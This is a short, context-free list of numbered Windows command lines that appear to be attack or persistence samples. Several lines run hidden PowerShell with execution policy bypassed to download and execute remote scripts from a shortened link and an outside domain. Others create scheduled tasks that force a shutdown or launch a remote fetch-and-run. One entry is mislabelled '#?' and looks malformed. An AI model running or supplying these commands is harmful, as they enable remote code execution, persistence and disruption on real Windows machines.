#1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ($ie = New-Object -ComObject InternetExplorer.Application).Navigate('http://www.google.com')

#2
C:\Windows\System32\schtasks.exe /Create /TN "Last Task" /TR "shutdown -s -t 0" /SC ONCE /ST 23:59 /SD 21/12/2016

#3
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -nop -ep bypass -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1GdJt3F')"

#?
C:\Windows\System32\schtasks.exe /Create /TN "Last Task" /TR "iex(New-Object Net.WebClient).DownloadString('http://www.geographycollector.com/shared/ps.dat')" /SC ONCE /ST 23:59 /SD 21/12/2016

#5
C:\Windows\System32\schtasks.exe /Create /TN "Last Task" /TR "%ComSpec% /c \"C:\Windows\System32\calc.exe\"" /SC ONCE /ST 23:59 /SD 21/12/2016

